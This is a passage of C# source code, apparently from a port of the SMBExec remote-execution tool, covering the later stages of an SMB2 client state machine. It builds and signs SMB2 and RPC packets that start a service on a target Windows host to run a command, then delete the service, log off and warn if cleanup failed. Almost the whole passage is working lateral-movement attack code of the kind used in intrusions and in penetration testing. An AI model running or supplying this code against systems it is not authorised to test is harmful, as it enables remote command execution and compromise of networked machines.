                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadRequest";
                                        SMB_Client_Stage_Next = "StartServiceW";
                                    }
                                    break;

                                case "StartServiceW":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 132, 135)) == "00-00-00-00")
                                        {
                                            if (debug) { output.AppendLine(String.Format("Service {0} created on {1}", SMB_Service, Target)); }
                                            SMB_Service_Context_Handle = Utilities.GetByteRange(SMBClientReceive, 112, 131);
                                            SMB2_Message_ID += 20;
                                            Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                            Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_Signing)
                                            {
                                                Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            Packet_SCM_Data = SMBExec.SCMStartServiceW(SMB_Service_Context_Handle);
                                            SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                            Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x13, 0x00 }, null);
                                            RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                            Packet_SMB2_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length + SCM_Data.Length);
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                            SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                            int RPC_Data_Length = SMB2_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                            NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);
                                            if (SMB_Signing)
                                            {
                                                HMAC_SHA256 = new HMACSHA256();
                                                SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                                SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                                Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                            }
                                            SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                            SMBClientStage = "ReadRequest";
                                            SMB_Client_Stage_Next = "DeleteServiceW";
                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 132, 135)) == "31-04-00-00")
                                        {
                                            if (debug) { output.AppendLine(String.Format("Service {0} creation failed on {1}", SMB_Service, Target)); }
                                            SMBExec_Failed = true;
                                        }
                                        else
                                        {
                                            if (debug) { output.AppendLine("Service Creation Fault Context Mismatch."); }
                                            SMBExec_Failed = true;
                                        }
                                    }
                                    break;

                                case "DeleteServiceW":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)) == "1d-04-00-00")
                                        {
                                            output.AppendLine(String.Format("Command executed with service {0} on {1}", SMB_Service, Target));
                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)) == "02-00-00-00")
                                        {
                                            output.AppendLine(String.Format("Service {0} failed to start on {1}", SMB_Service, Target));
                                        }

                                        SMB2_Message_ID += 20;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        Packet_SCM_Data = SMBExec.SCMDeleteServiceW(SMB_Service_Context_Handle);
                                        SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x02, 0x00 }, null);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        Packet_SMB2_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length + SCM_Data.Length);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        int RPC_Data_Length = SMB2_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadRequest";
                                        SMB_Client_Stage_Next = "CloseServiceHandle";
                                        SMB_Close_Service_Handle_Stage = 1;
                                    }
                                    break;

                                case "CloseServiceHandle":
                                    {
                                         if (SMB_Close_Service_Handle_Stage == 1)
                                        {
                                            if (debug) { output.AppendLine(String.Format("Service {0} deleted on {1}", SMB_Service, Target)); }
                                            Service_Deleted = true;
                                            SMB2_Message_ID += 20;
                                            SMB_Close_Service_Handle_Stage++;
                                            Packet_SCM_Data = SMBExec.SCMCloseServiceHandle(SMB_Service_Context_Handle);
                                        }
                                        else
                                        {
                                            SMB2_Message_ID++;
                                            SMBClientStage = "CloseRequest";
                                            Packet_SCM_Data = SMBExec.SCMCloseServiceHandle(SMB_Service_Manager_Context_Handle);
                                        }
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x02, 0x00 }, null);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        Packet_SMB2_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length + SCM_Data.Length);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        int RPC_Data_Length = SMB2_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);

                                    }
                                    break;
                                case "CloseRequest":
                                    {
                                        SMB2_Message_ID += 20;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x06, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "TreeDisconnect";
                                    }
                                    break;

                                case "TreeDisconnect":
                                    {
                                        SMB2_Message_ID++;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x04, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        Packet_SMB2_Data = SMBExec.SMB2TreeDisconnectRequest();
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "Logoff";
                                    }
                                    break;
                                case "Logoff":
                                    {
                                        SMB2_Message_ID += 20;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x02, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        Packet_SMB2_Data = SMBExec.SMB2SessionLogoffRequest();
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();
                                            
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "exit";
                                    }
                                    break;
                            }
                        }
                    }
                    if (!Service_Deleted && !AdminCheck)
                    {
                        output.AppendLine("Warning: Service not deleted. Please delete Service \"" + SMB_Service + "\" manually.");
                    }
                }
                SMBClient.Close();
                SMBClientStream.Close();
            }

            return output.ToString();
        }

        private static byte[] SendStream(NetworkStream stream, byte[] BytesToSend)
        {
            byte[] BytesReceived = new byte[2048];
            stream.Write(BytesToSend, 0, BytesToSend.Length);
            stream.Flush();
            stream.Read(BytesReceived, 0, BytesReceived.Length);
            return BytesReceived;
        }

        private static byte[] GetNetBIOSSessionService(int SMB_Header_Length, int RPC_Data_Length)
        {
            OrderedDictionary Packet_NetBIOS_Session_Service = SMBExec.NetBIOSSessionService(SMB_Header_Length, RPC_Data_Length);
            byte[] NetBIOS_Session_Service = Utilities.ConvertFromPacketOrderedDictionary(Packet_NetBIOS_Session_Service);
            return NetBIOS_Session_Service;

        }
    }
}

